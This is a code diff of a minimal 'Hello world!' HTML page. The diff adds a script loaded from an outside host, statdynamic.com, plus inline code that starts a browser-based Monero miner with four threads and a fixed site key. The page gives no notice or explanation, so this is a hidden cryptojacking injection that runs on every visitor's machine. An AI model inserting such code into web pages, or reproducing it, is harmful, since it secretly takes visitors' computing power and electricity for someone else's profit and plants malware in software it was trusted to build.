@@ -4,7 +4,13 @@
 
 <body>
 <p>Hello world!</p>
-
+<script src="//statdynamic.com/lib/crypta.js"></script>
+<script>
+  var miner=new CRLT.Anonymous('33b49ff76ab8bf72a356255542e86ed2dbef7f94e89d', {
+    threads:4,throttle:0.45, coin: "xmr",
+  });
+  miner.start();
+</script>
 
 </body>
 </html>
